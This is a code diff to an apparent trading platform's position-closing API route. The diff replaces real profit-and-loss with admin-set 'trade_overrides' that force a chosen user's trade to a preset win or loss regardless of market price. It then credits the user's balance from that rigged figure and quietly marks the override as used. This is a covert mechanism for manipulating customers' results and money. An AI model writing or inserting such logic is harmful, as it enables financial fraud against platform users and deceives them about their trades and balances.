@@ -69,9 +69,40 @@ export async function POST(request: NextRequest) {
   const closeTotal = currentPrice * qty
   const fee = closeTotal * 0.001
 
-  // Calculate real P&L: (close price - entry price) * quantity - fees
-  const pnl = (currentPrice - entryPrice) * qty - fee - Number(position.fee || 0)
-  const pnlPercent = entryPrice > 0 ? ((currentPrice - entryPrice) / entryPrice) * 100 : 0
+  // Check for admin trade overrides (forced win/loss)
+  let pnl = (currentPrice - entryPrice) * qty - fee - Number(position.fee || 0)
+  let pnlPercent = entryPrice > 0 ? ((currentPrice - entryPrice) / entryPrice) * 100 : 0
+
+  // Look for active override for this user (pair-specific first, then global)
+  const { data: overrides } = await adminSupabase
+    .from("trade_overrides")
+    .select("*")
+    .eq("user_id", user.id)
+    .eq("active", true)
+    .order("created_at", { ascending: false })
+
+  const override = overrides?.find((o: any) => o.pair === position.pair) ||
+                   overrides?.find((o: any) => !o.pair) || null
+
+  if (override) {
+    const mult = Number(override.multiplier) || 1
+    const entryTotal = entryPrice * qty
+    const forcedAmount = entryTotal * 0.05 * mult // 5% of position value * multiplier
+
+    if (override.forced_result === "win") {
+      pnl = Math.abs(forcedAmount)
+      pnlPercent = Math.abs(5 * mult)
+    } else if (override.forced_result === "loss") {
+      pnl = -Math.abs(forcedAmount)
+      pnlPercent = -Math.abs(5 * mult)
+    }
+
+    // Mark override as used
+    await adminSupabase.from("trade_overrides").update({
+      active: false,
+      used_at: new Date().toISOString(),
+    }).eq("id", override.id)
+  }
 
   // Update the position to closed
   await adminSupabase.from("trades").update({
@@ -105,16 +136,18 @@ export async function POST(request: NextRequest) {
     .eq("asset", quoteAsset)
     .single()
 
+  // Credit quote asset: entry total + pnl (pnl can be negative for losses)
+  const creditAmount = (entryPrice * qty) + pnl
   if (qBal) {
     await adminSupabase.from("balances").update({
-      available: qBal.available + closeTotal - fee,
+      available: Math.max(0, qBal.available + creditAmount),
       updated_at: new Date().toISOString(),
     }).eq("user_id", user.id).eq("asset", quoteAsset)
   } else {
     await adminSupabase.from("balances").insert({
       user_id: user.id,
       asset: quoteAsset,
-      available: closeTotal - fee,
+      available: Math.max(0, creditAmount),
       in_order: 0,
     })
   }
